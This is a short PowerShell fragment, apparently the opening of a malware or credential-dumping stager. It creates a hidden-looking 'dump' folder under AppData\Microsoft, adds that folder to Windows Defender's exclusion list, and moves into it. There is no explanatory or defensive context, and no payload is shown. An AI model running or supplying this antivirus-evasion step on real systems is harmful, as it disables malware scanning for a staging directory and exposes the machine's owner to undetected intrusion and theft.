mkdir "$env:appdata\Microsoft\dump"
#Adding windows defender exclusionpath
Add-MpPreference -ExclusionPath "$env:appdata\Microsoft\dump"
Set-Location "$env:appdata\Microsoft\dump"
